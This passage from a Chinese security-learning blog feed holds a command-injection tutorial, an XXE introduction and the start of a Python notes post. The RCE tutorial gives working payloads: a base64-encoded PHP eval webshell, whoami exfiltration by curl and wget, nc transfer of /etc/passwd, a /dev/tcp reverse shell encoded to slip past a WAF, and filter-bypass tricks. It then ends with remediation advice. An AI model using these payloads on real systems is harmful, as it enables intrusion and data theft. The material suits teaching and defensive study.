system,exec,shell_exec,passthru,proc_open,proc_close,proc_get_status,checkdnsrr,getmxrr,getservbyname,getservbyport,syslog,popen,show_source,highlight_file,dl,socket_listen,socket_create,socket_bind,socket_accept,socket_connect,stream_socket_server,stream_socket_accept,stream_socket_client,ftp_connect,ftp_login,ftp_pasv,ftp_get,sys_getoadavg,disk_total_space,disk_free_space,posix_ctermid,posix_get_last_error,posix_getcwd,posix_getegid,posix_geteuid,posix_getgid,posix_getgrgid,posix_getgrnam,posix_getgroups,posix_getlogin,posix_getpgid,posix_getpgrp,posix_getpid,posix_getppid,posix_getpwnam,posix_getpwuid,posix_getrlimit,posix_getsid,posix_getuid,posix_isatty,posix_kill,posix_mkfifo,posix_setegid,posix_seteuid,posix_setgid,posix_setpgid,posix_setsid,posix_setuid,posix_strerror,posix_times,posix_ttyname,posix_uname</span><br></pre></td></tr></table></figure><h2 id="3、RCE危害"><a href="#3、RCE危害" class="headerlink" title="3、RCE危害"></a>3、RCE危害</h2><ul><li>继承 Web 服务器程序的权限，去执⾏系统命令; </li><li>继承 Web 服务器程序的权限，读写⽂件; </li><li>反弹 shell ; 控制整个⽹站 ;</li><li>甚⾄控制整个服务 。</li></ul><h2 id="4、RCE代码分析"><a href="#4、RCE代码分析" class="headerlink" title="4、RCE代码分析"></a>4、RCE代码分析</h2><p>ipaddress 参数是外部可以控制的， 经过 explode 拆分，再判断类型，再使⽤ shell_exec 函数，调⽤系统命令，所以存在命令执⾏漏洞。<br><img src="http://120.48.107.243:9090/blog/2023/04/03/8e8e30261d5e45bf9091205e99828855.png" alt="在这里插入图片描述"></p><h2 id="5、RCE攻击"><a href="#5、RCE攻击" class="headerlink" title="5、RCE攻击"></a>5、RCE攻击</h2><h3 id="（1）命令链接符"><a href="#（1）命令链接符" class="headerlink" title="（1）命令链接符"></a>（1）命令链接符</h3><h4 id="a-；-分号-linux-amp-powershell"><a href="#a-；-分号-linux-amp-powershell" class="headerlink" title="a. ； 分号 linux&amp;powershell"></a>a. ； 分号 linux&amp;powershell</h4><p>命令按照顺序（从左到右）被执⾏，并且可以⽤分号进⾏分隔。当有⼀条命令执⾏失败时，不会中断其它命令的执⾏。 </p><figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>;whoami </span><br></pre></td></tr></table></figure><p><img src="http://120.48.107.243:9090/blog/2023/04/03/e639f02a33d24da5b68f8f97a302afca.png" alt="在这里插入图片描述"></p><h4 id="b-管道符号"><a href="#b-管道符号" class="headerlink" title="b. | 管道符号"></a>b. | 管道符号</h4><p>通过管道符，可以将一个命令的标准输出管理为另外一个命令的标准输入，当它失败后，会执行另外一条命令。</p><figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>|whoami</span><br></pre></td></tr></table></figure><p><img src="http://120.48.107.243:9090/blog/2023/04/03/d9b3863f90bf421fb9e2185cdc381ba4.png" alt="在这里插入图片描述"></p><h4 id="c-amp-后台任务符合-linux-amp-cmd"><a href="#c-amp-后台任务符合-linux-amp-cmd" class="headerlink" title="c. &amp; 后台任务符合 linux&amp;cmd"></a>c. &amp; 后台任务符合 linux&amp;cmd</h4><p>命令按照顺序（从左到右）被执行，跟分号作用一样，此符号作用是后台任务符号使shell在后台执行该任务，这样用户就可以立即得到了一个提示符并继续其他工作。</p><figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>&amp;whoami&amp;</span><br></pre></td></tr></table></figure><p><img src="http://120.48.107.243:9090/blog/2023/04/03/1bc1b6c566244e3d9da78b764823a5dc.png" alt="在这里插入图片描述"></p><h4 id="d-amp-amp-逻辑与-linux-amp-cmd"><a href="#d-amp-amp-逻辑与-linux-amp-cmd" class="headerlink" title="d.&amp;&amp; 逻辑与 linux&amp;cmd"></a>d.&amp;&amp; 逻辑与 linux&amp;cmd</h4><p>前后的命令执行存在逻辑与关系，只有&amp;&amp;前面的命令执行成功之后，它后面的命令才被执行。</p><figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>&amp;&amp;whoami</span><br></pre></td></tr></table></figure><p><img src="http://120.48.107.243:9090/blog/2023/04/03/20099b40f1984a8a998afcf3325d901a.png" alt="在这里插入图片描述"></p><h4 id="e-逻辑或-linux-amp-cmd"><a href="#e-逻辑或-linux-amp-cmd" class="headerlink" title="e.|| 逻辑或 linux&amp;cmd"></a>e.|| 逻辑或 linux&amp;cmd</h4><p>前后命令的执⾏存在逻辑或关系，只有【 || 】前⾯的命令执⾏失败后，它后⾯的命令才被执⾏。</p><figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping -c ||whoami</span><br></pre></td></tr></table></figure><p><img src="http://120.48.107.243:9090/blog/2023/04/03/65cadb5ff1c8446197f069353a20228c.png" alt="在这里插入图片描述"></p><h4 id="f-96-反引号-linux"><a href="#f-96-反引号-linux" class="headerlink" title="f. &#96; 反引号 linux"></a>f. &#96; 反引号 linux</h4><p>当一个命令被解析时，它首先会执行反引号之间的操作，例如执行echo ls -a将会首先执行ls并捕获其输出信息，然后再将它传递给echo，并将ls的输出结果打印在屏幕上，这被称为命令替换。</p><figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo `whoami`</span><br></pre></td></tr></table></figure><p><img src="http://120.48.107.243:9090/blog/2023/04/03/1354dbfa683b4715b84f07675fc36745.png" alt="在这里插入图片描述"></p><h3 id="（2）有回显"><a href="#（2）有回显" class="headerlink" title="（2）有回显"></a>（2）有回显</h3><p>发现命令执行漏洞，如果是回显的情况下，获取系统敏感信息。</p><figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">win 操作系统：</span><br><span class="line"> type c:\windows\win.ini</span><br><span class="line">linux 操作系统：</span><br><span class="line"> cat /etc/passwd </span><br></pre></td></tr></table></figure><h3 id="（3）无回显"><a href="#（3）无回显" class="headerlink" title="（3）无回显"></a>（3）无回显</h3><p>有回显的情况下相对较少，一般在实战环境中，无回显的环境较多，证明漏洞存在就需要各种利用外通信技巧。<br>##6、RCE外带通信技巧<br>###（1）利用管道符写shell<br>假设，如果存在漏洞的页面有web服务器，有权限写入，利用shell命令写入webshell后门到网站目录，访问即可获取webshell。</p><figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">linux:</span><br><span class="line"> echo <span class="string">&quot;PD9waHAgcGhwaW5mbygpO2V2YWwoJF9QT1NUWydjbWQnXSk/Pg==&quot;</span>|base64 -d</span><br><span class="line">&gt;shell.php</span><br><span class="line">windows:</span><br><span class="line"> powershell.exe</span><br><span class="line">$data=<span class="string">&#x27;PD9waHAgcGhwaW5mbygpO2V2YWwoJF9QT1NUWydjbWQnXSk/Pg==&#x27;</span>;</span><br><span class="line">[System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String(</span><br><span class="line">$data)) &gt; shell.php</span><br></pre></td></tr></table></figure><p><img src="http://120.48.107.243:9090/blog/2023/04/03/56355c55e1744af3afe8140258e91a45.png" alt="在这里插入图片描述"></p><h3 id="（2）其他方式写入shell"><a href="#（2）其他方式写入shell" class="headerlink" title="（2）其他方式写入shell"></a>（2）其他方式写入shell</h3><p>前提：必须要有写⼊权限<br>linux执⾏pwd得到绝对路径<br>win执⾏chdir得到绝对路径</p><figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 直接写</span><br><span class="line"> ?cmd=echo <span class="string">&quot;&lt;?php phpinfo();?&gt;&quot;</span> &gt; info.php</span><br><span class="line"># 不能写时</span><br><span class="line"> ?cmd=wget -o /var/www/html/info.php http:<span class="comment">//www.xx.com/phpinfo.txt</span></span><br><span class="line"># 不可写时</span><br><span class="line"> ?cmd=curl http:<span class="comment">//www.xx.com/phpinfo.txt &gt; /var/www/html/info.php</span></span><br></pre></td></tr></table></figure><h3 id="（3）DNSlog平台"><a href="#（3）DNSlog平台" class="headerlink" title="（3）DNSlog平台"></a>（3）DNSlog平台</h3><p>dnslog 是⼀个显示解析记录的平台，在⽆回显的情况下，通过访问 dnslog，dnslog 会把你访问的⼦域名的头⽂件记录下来。<br>    linux主机下<br><img src="http://120.48.107.243:9090/blog/2023/04/03/027ebc95f82848ce8644b672ca6e6339.png" alt="在这里插入图片描述"><br><img src="http://120.48.107.243:9090/blog/2023/04/03/8aabc047c8be4ed1bbd38f8bba51fef2.png" alt="在这里插入图片描述"></p><h3 id="（4）burpsuite下的burpcollaborator测试无回显"><a href="#（4）burpsuite下的burpcollaborator测试无回显" class="headerlink" title="（4）burpsuite下的burpcollaborator测试无回显"></a>（4）burpsuite下的burpcollaborator测试无回显</h3><p>测试的原理和dnslog一样。<br><img src="http://120.48.107.243:9090/blog/2023/04/03/2c06a5db32304a5ca36bff505b21ca3d.png" alt="在这里插入图片描述"></p><h3 id="（5）利用日志测试无回显"><a href="#（5）利用日志测试无回显" class="headerlink" title="（5）利用日志测试无回显"></a>（5）利用日志测试无回显</h3><p>利用HTTP协议，访问WEB中间件时，IIS或者Apache或者小型服务，都存在访问日志，在主机上开启python的小型服务器，再用curl协议访问远程服务器IP的80端口，在回到终端查看记录即可。</p><figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server <span class="number">80</span></span><br><span class="line">使⽤ curl 命令：</span><br><span class="line"> ping -c <span class="number">4</span> || curl http:<span class="comment">//192.168.1.15/?`whoami`</span></span><br><span class="line">使⽤ wget 命令：</span><br><span class="line"> ping -c <span class="number">4</span> ||wget http:<span class="comment">//192.168.1.15/?`whoami` </span></span><br></pre></td></tr></table></figure><p>必须双方系统上有这两个程序。<br><img src="http://120.48.107.243:9090/blog/2023/04/03/536ada6f979a446092cc5337b04eb193.png" alt="在这里插入图片描述"></p><h3 id="（6）Netcat"><a href="#（6）Netcat" class="headerlink" title="（6）Netcat"></a>（6）Netcat</h3><p>NC（netcat）被称为网络工具中的瑞士军刀，体积小巧，但功能强大。<br>Nc主要功能：<br>Nc可以在两台设备上⾯相互交互，即侦听模式&#x2F;传输模式</p><ul><li>Telnet功能</li><li>获取banner信息</li><li>传输⽂本信息</li><li>传输⽂件&#x2F;⽬录</li><li>加密传输⽂件，默认不加密</li><li>远程控制</li><li>加密所有流量</li><li>流媒体服务器</li><li>远程克隆硬盘</li></ul><h4 id="a-文件传输"><a href="#a-文件传输" class="headerlink" title="a.文件传输"></a>a.文件传输</h4><figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">远程服务器监听命令(server)：</span><br><span class="line"> nc -lvnp <span class="number">9999</span> &gt;passwd</span><br><span class="line">本地执⾏命令(baji) ：</span><br><span class="line"> nc <span class="number">192.168</span><span class="number">.1</span><span class="number">.15</span> <span class="number">9999</span> &lt;/etc/passwd</span><br></pre></td></tr></table></figure><p><img src="http://120.48.107.243:9090/blog/2023/04/03/30a9796e8a874914871b404b060f947f.png" alt="在这里插入图片描述"></p><h4 id="b-nc反弹shell"><a href="#b-nc反弹shell" class="headerlink" title="b.nc反弹shell"></a>b.nc反弹shell</h4><p>执行命令漏洞，一般的利用方式是执行反弹shell，再进行其他的操作。<br>执行反弹shell的命令有许多，反弹shell是因为从受害者，反向连接远程服务器，请求从内部到外部，所以防火墙是不会进行拦截的。<br><img src="http://120.48.107.243:9090/blog/2023/04/03/64ce04937490434e87a25a7cde9bb27d.png" alt="在这里插入图片描述"><br>如果有 waf 进⾏拦截，可以把语句进⾏ base64 加密后，因为加密后的字符串没有触发拦截规则，再利⽤ shell 命令再进⾏解码。 </p><figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">bash -c <span class="string">&#x27;exec bash -i &amp;&gt;/dev/tcp/192.168.1.15/9999 &lt;&amp;1&#x27;</span></span><br><span class="line">base64 编码后：</span><br><span class="line">YmFzaCAtYyAnZXhlYyBiYXNoIC1pICY+L2Rldi90Y3AvMTkyLjE2OC4xLjE1Lzk5OTkgPCYxJw=</span><br><span class="line">=</span><br><span class="line">受害机执⾏：</span><br><span class="line"> echo</span><br><span class="line"><span class="string">&quot;YmFzaCAtYyAnZXhlYyBiYXNoIC1pICY+L2Rldi90Y3AvMTkyLjE2OC4xLjE1Lzk5OTkgPCYxJw</span></span><br><span class="line"><span class="string">==&quot;</span>|base64 -d|bash</span><br><span class="line">服务器监听：</span><br><span class="line"> nc -lvp <span class="number">9999</span></span><br></pre></td></tr></table></figure><h2 id="7、RCE绕过"><a href="#7、RCE绕过" class="headerlink" title="7、RCE绕过"></a>7、RCE绕过</h2><h3 id="（1）黑名单绕过"><a href="#（1）黑名单绕过" class="headerlink" title="（1）黑名单绕过"></a>（1）黑名单绕过</h3><figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">拼接:</span><br><span class="line"> a=ca;b=t;c=test; $a$b $c.txt</span><br><span class="line"> base64编码:</span><br><span class="line"> `echo <span class="string">&quot;Y2F0IHRlc3QudHh0&quot;</span>|base64 -d`</span><br><span class="line"> echo <span class="string">&quot;Y2F0IHRlc3QudHh0&quot;</span>|base64 -d|bash</span><br><span class="line">单引号，双引号:</span><br><span class="line"> ca<span class="string">&quot;&quot;</span>t test<span class="string">&#x27;&#x27;</span>.txt</span><br><span class="line">反斜线:</span><br><span class="line"> c\at test.t\xt</span><br><span class="line">可变扩展绕过:</span><br><span class="line"> /???/c?t /???/p?ss??</span><br><span class="line"> test=/ehhh/hmtc/pahhh/hmsswd</span><br><span class="line"> cat $&#123;test<span class="comment">//hhh\/hm/&#125;</span></span><br><span class="line"> cat $&#123;test<span class="comment">//hh??hm/&#125;</span></span><br><span class="line">⽤通配符绕过:</span><br><span class="line"> <span class="meta"># notepad</span></span><br><span class="line"> powershell C:\*\*<span class="number">2</span>\n??e*d.*?</span><br><span class="line"> <span class="meta"># calc</span></span><br><span class="line"> @^p^o^w^e^r^shell c:\*\*<span class="number">32</span>\c*?c.e?e</span><br><span class="line">shell特殊变量（$<span class="number">1</span>，$<span class="number">2</span>等和$@）</span><br><span class="line"> ca$@t test$<span class="number">1.</span>txt</span><br></pre></td></tr></table></figure><h3 id="（2）长度限制绕过"><a href="#（2）长度限制绕过" class="headerlink" title="（2）长度限制绕过"></a>（2）长度限制绕过</h3><p>通过构造⽂件来绕过</p><figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">linux下可以⽤:</span><br><span class="line"> <span class="number">1</span> &gt; a <span class="comment">//创建⽂件名为a的空⽂件</span></span><br><span class="line"> ls -t&gt;test <span class="comment">//则会将⽬录按时间排序后写进test⽂件中</span></span><br><span class="line"> sh <span class="comment">//命令可以从⼀个⽂件中读取命令来执⾏</span></span><br><span class="line"> echo <span class="string">&quot;whoami&quot;</span> &gt; <span class="number">1.</span>txt</span><br><span class="line"> sh <span class="number">1.</span>txt</span><br></pre></td></tr></table></figure><h3 id="（3）空格绕过"><a href="#（3）空格绕过" class="headerlink" title="（3）空格绕过"></a>（3）空格绕过</h3><h4 id="a-linux平台（bash下）"><a href="#a-linux平台（bash下）" class="headerlink" title="a.linux平台（bash下）"></a>a.linux平台（bash下）</h4><figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">root@localhost:~/Www$ cat&lt;/etc/passwd</span><br><span class="line">root:x:<span class="number">0</span>:<span class="number">0</span>:root:/root:/bin/bash</span><br><span class="line">root@localhost▸ ~ ▸ $ &#123;cat,/etc/passwd&#125;</span><br><span class="line">root:x:<span class="number">0</span>:<span class="number">0</span>:root:/root:/bin/bash</span><br><span class="line">daemon:x:<span class="number">1</span>:<span class="number">1</span>:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">root@localhost▸ ~ ▸ $ cat$IFS/etc/passwd</span><br><span class="line">root:x:<span class="number">0</span>:<span class="number">0</span>:root:/root:/bin/bash</span><br><span class="line">daemon:x:<span class="number">1</span>:<span class="number">1</span>:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">root@localhost▸ ~ ▸ $ echo$&#123;IFS&#125;<span class="string">&quot;RCE&quot;</span>$&#123;IFS&#125;&amp;&amp;cat$&#123;IFS&#125;/etc/passwd</span><br><span class="line">RCE</span><br><span class="line">root:x:<span class="number">0</span>:<span class="number">0</span>:root:/root:/bin/bash</span><br><span class="line">daemon:x:<span class="number">1</span>:<span class="number">1</span>:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">root@localhost▸ ~ ▸ $ X=$<span class="string">&#x27;uname\x20-a&#x27;</span>&amp;&amp;$X</span><br><span class="line">Linux crashlab <span class="number">4.4</span>.X-XX-generic #<span class="number">72</span>-Ubuntu</span><br><span class="line">root@localhost▸ ~ ▸ $ sh&lt;/dev/tcp/<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/<span class="number">4242</span></span><br></pre></td></tr></table></figure><h4 id="b-windows平台"><a href="#b-windows平台" class="headerlink" title="b.windows平台"></a>b.windows平台</h4><figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">ping%CommonProgramFiles:~<span class="number">10</span>,<span class="number">-18</span>%baidu.com</span><br><span class="line">ping%PROGRAMFILES:~<span class="number">10</span>,<span class="number">-5</span>%baidu.com</span><br><span class="line">%COMMONPROGRAMFILES:~<span class="number">23</span>,<span class="number">-5</span>%</span><br><span class="line">%ProgramFiles:~<span class="number">10</span>,<span class="number">-5</span>%</span><br><span class="line">%CommonProgramFiles:~<span class="number">10</span>,<span class="number">-18</span>%</span><br><span class="line">%COMMONPROGRAMFILES:~<span class="number">23</span>,<span class="number">1</span>%</span><br><span class="line">%ProgramFiles:~<span class="number">10</span>,<span class="number">1</span>%</span><br><span class="line">%CommonProgramFiles:~<span class="number">10</span>,<span class="number">1</span>%</span><br><span class="line">%path:~<span class="number">10</span>,<span class="number">1</span>%</span><br><span class="line">%PROCESSOR_IDENTIFIER:~<span class="number">7</span>,<span class="number">1</span>%</span><br></pre></td></tr></table></figure><h3 id="（4）引号逃逸"><a href="#（4）引号逃逸" class="headerlink" title="（4）引号逃逸"></a>（4）引号逃逸</h3><p>当恶意命令被扩在引号内时，可⽤ \ 转义引号逃逸<br>###（5）不带反斜杠和斜杠的命令执行</p><figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">linux bash：</span><br><span class="line"> echo $&#123;HOME:<span class="number">0</span>:<span class="number">1</span>&#125;</span><br><span class="line"> /</span><br><span class="line"> cat $&#123;HOME:<span class="number">0</span>:<span class="number">1</span>&#125;etc$&#123;HOME:<span class="number">0</span>:<span class="number">1</span>&#125;passwd</span><br><span class="line"> root:x:<span class="number">0</span>:<span class="number">0</span>:root:/root:/bin/bash</span><br><span class="line"> echo . | tr <span class="string">&#x27;!-0&#x27;</span> <span class="string">&#x27;&quot;-1&#x27;</span></span><br><span class="line"> /</span><br><span class="line"> tr <span class="string">&#x27;!-0&#x27;</span> <span class="string">&#x27;&quot;-1&#x27;</span> &lt;&lt;&lt; .</span><br><span class="line"> /</span><br><span class="line"> cat $(echo . | tr <span class="string">&#x27;!-0&#x27;</span> <span class="string">&#x27;&quot;-1&#x27;</span>)etc$(echo . | tr <span class="string">&#x27;!-0&#x27;</span> <span class="string">&#x27;&quot;-1&#x27;</span>)passwd</span><br><span class="line"> root:x:<span class="number">0</span>:<span class="number">0</span>:root:/root:/bin/bash</span><br></pre></td></tr></table></figure><h2 id="8、RCE修复"><a href="#8、RCE修复" class="headerlink" title="8、RCE修复"></a>8、RCE修复</h2><p>不执⾏外部的应⽤程序或命令：<br>尽量使⽤⾃定义函数或函数库实现外部应⽤程序或命令的功能。在执⾏system、eval 等命令执⾏功能的函 数前，要确认参数内容。使⽤ escapeshellarg 函数处理相关参数：escapeshellarg 函数会将⽤户引起参数或命令结束的字符进⾏转义，如单引号“’”会被转义为“’”， 双引号“””会被转义为“””，分号“;”会被转义为“;”，这样escapeshellarg 会将参数内容限制在⼀对单引号或双引号⾥⾯，转义参数中包括的单引号或双引号，使其⽆法对当前执⾏进⾏截断，实现防范命令注⼊攻击的⽬的。<br>使⽤ safe_mode_exec_dir 执⾏可执⾏的⽂件路径 ：<br>将 php.ini ⽂件中的 safe_mode 设置为 On，然后将允许执⾏的⽂件放⼊⼀个⽬录，并使⽤ safe_mode_exec_dir 指定这个可执⾏的⽂件路径。这样，在需要执⾏相应的外部程序时，程序必须在 safe_mode_exec_dir 指定的⽬录中才会允许执⾏，否则执⾏将失败。 </p>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
          <category> 漏洞学习 </category>
          
          <category> RCE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 信息安全 </tag>
            
            <tag> 漏洞学习 </tag>
            
            <tag> RCE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XXE漏洞的学习</title>
      <link href="/2022/05/08/xxe_study/"/>
      <url>/2022/05/08/xxe_study/</url>
      
        <content type="html"><![CDATA[<h1 id="一、XXE描述"><a href="#一、XXE描述" class="headerlink" title="一、XXE描述"></a>一、XXE描述</h1><h2 id="1、前言"><a href="#1、前言" class="headerlink" title="1、前言"></a>1、前言</h2><p>XML外部实体注入，简称XXE漏洞，XML用于标记电子文件使其具有结构性的标记语言，可以用来标记数据、定义数据类型，是一种允许用户对自己的标记语言进行定义的源语言。XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素，目前，XML文件作为配置文件（Spring、Strust2等）、文档结构说明文件（PDF、RSS等）、图片格式文件（SVG header）应用比较广泛。XML的语法规范由DTD来进行控制。<br>##2、简介<br>XML是可扩展的标记语言，设计用来进行数据的传输和存储。<br>#二、XML和DTD介绍<br>##1、示例<br><img src="http://120.48.107.243:9090/blog/2023/04/03/6869b11e54dd4197940d6b59f860e642.png" alt="在这里插入图片描述"><br><img src="http://120.48.107.243:9090/blog/2023/04/03/a631c066f56445a8b8a7d6085e3ac4fb.png" alt="在这里插入图片描述"></p><h2 id="2、PCDATA"><a href="#2、PCDATA" class="headerlink" title="2、PCDATA"></a>2、PCDATA</h2><p>pcdata的意思是被解析的字符数据。<br>可以把字符数据想象为XML元素的开始标签与结束标签之间的文本，PCDATA是会被解析器解析的文本，这些文本将被解析器检查实体以及标记，文本中的标签会被当做标记来处理，而实体会被展开，不过，被解析的字符数据不应当包含任何&amp;、&lt;、&gt;字符，需要用&amp;amp；&amp;lt；以及&amp;gt；实体来分别替换他们。<br>##3、CDATA<br>CDATA的意思是字符数据。<br>CDATA是不会被解析器解析的文本，在这些文本中的标签不会被当做标记来对待，其中的实体也不会被展开。<br>##4、常见的xml语法结构<br><img src="https://img-blog.csdnimg.cn/9413138239114a1196736bdf933d382b.png" alt="在这里插入图片描述"><br>实体：实体是对数据的引用，根据实体种类的不同，XML解析器将使用实体的替代文本或者外部文档的内容来替代实体引用，它主要分为以下四类。</p><ul><li>内置实体</li><li>字符实体</li><li>通用实体</li><li>参数实体<br> 参数实体用%实体名称申明，引用时也用%实体名称。<br> 其余实体直接用实体名称申明，引用时用实体名称。<br> 参数实体只能在DTD中申明，DTD中引用。<br> 其余实体只能在DTD中申明，在xml文档中引用。<br> &#x3D;&#x3D;注意：参数实体是在DTD中被引用的，而其余实体是在xml文档中被引用的，另外定义%后面跟空格。&#x3D;&#x3D;</li></ul><h2 id="5、DTD中的一些重要关键字"><a href="#5、DTD中的一些重要关键字" class="headerlink" title="5、DTD中的一些重要关键字"></a>5、DTD中的一些重要关键字</h2><ul><li>DOCTYPE（DTD的声明）</li><li>ENTITY(实体的声明)</li><li>SYSTEM、PUBLIC（外部资源申请）</li></ul><h2 id="6、内部实体声明"><a href="#6、内部实体声明" class="headerlink" title="6、内部实体声明"></a>6、内部实体声明</h2><p><img src="http://120.48.107.243:9090/blog/2023/04/03/ec04c5fa30db47499516f97448411c1c.png" alt="在这里插入图片描述"><br>##7、外部实体声明<br><img src="http://120.48.107.243:9090/blog/2023/04/03/cbd45579df8b4c998c15161575c4a959.png" alt="在这里插入图片描述"><br><img src="http://120.48.107.243:9090/blog/2023/04/03/e7ab4fd4e0d4439a9f01a97f1acacb1a.png" alt="在这里插入图片描述"></p><h2 id="8、参数实体格式"><a href="#8、参数实体格式" class="headerlink" title="8、参数实体格式"></a>8、参数实体格式</h2><p><img src="http://120.48.107.243:9090/blog/2023/04/03/96639e26251245308ac70015f0ec444f.png" alt="在这里插入图片描述"></p><h1 id="三、XXE漏洞防御方案"><a href="#三、XXE漏洞防御方案" class="headerlink" title="三、XXE漏洞防御方案"></a>三、XXE漏洞防御方案</h1><h2 id="1、使用开发语言提供的禁用外部实体的方法"><a href="#1、使用开发语言提供的禁用外部实体的方法" class="headerlink" title="1、使用开发语言提供的禁用外部实体的方法"></a>1、使用开发语言提供的禁用外部实体的方法</h2><p><img src="http://120.48.107.243:9090/blog/2023/04/03/2a12b68bc9bb47108a3d1ae673581224.png" alt="在这里插入图片描述"><br>##2、过滤用户提交的XML数据<br><img src="http://120.48.107.243:9090/blog/2023/04/03/a514a1f9e8d34d3d83aa339c0ea8ae73.png" alt="在这里插入图片描述"><br>##3、升级libxml组件</p>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
          <category> 漏洞学习 </category>
          
          <category> XXE漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 信息安全 </tag>
            
            <tag> 漏洞学习 </tag>
            
            <tag> XXE漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python学习日记（八）</title>
      <link href="/2022/05/07/python_eight/"/>
      <url>/2022/05/07/python_eight/</url>
      
        <content type="html"><![CDATA[<p><img src="http://120.48.107.243:9090/blog/2023/04/03/f54ac64acb7347f796b984da66c66201.png" alt="在这里插入图片描述"><br>&#x3D;&#x3D;本篇文章记录的是Python基础数据类型补充以及内置方法的知识。&#x3D;&#x3D;</p><h1 id="一、引入"><a href="#一、引入" class="headerlink" title="一、引入"></a>一、引入</h1><p>之前我们已经对python基础数据类型有了一个简单的认识，比如有字符串，布尔值，列表，元组，集合，字典等，但是那些都是基础的了解，对于基础数据类型我们还要进一步的学习他们，以及他们常用的内置方法。<br>#二、数字类型<br>##1、定义</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">age = <span class="number">18</span> </span><br><span class="line"></span><br><span class="line"><span class="comment"># 实际上这是python的字面量语法,内部调用的是age=int(10)</span></span><br><span class="line"><span class="comment"># 先是在堆区中申请一块内存空间,把10存进去,然后把内存地址绑定给栈区的变量名.</span></span><br></pre></td></tr></table></figure><h2 id="2、类型转换"><a href="#2、类型转换" class="headerlink" title="2、类型转换"></a>2、类型转换</h2><h3 id="（1）字符串转数字"><a href="#（1）字符串转数字" class="headerlink" title="（1）字符串转数字"></a>（1）字符串转数字</h3><p>int可以将由纯整数构成的字符串直接转换成整型，若包含其他任意非整数符号，则会报错。</p><figure class="highlight 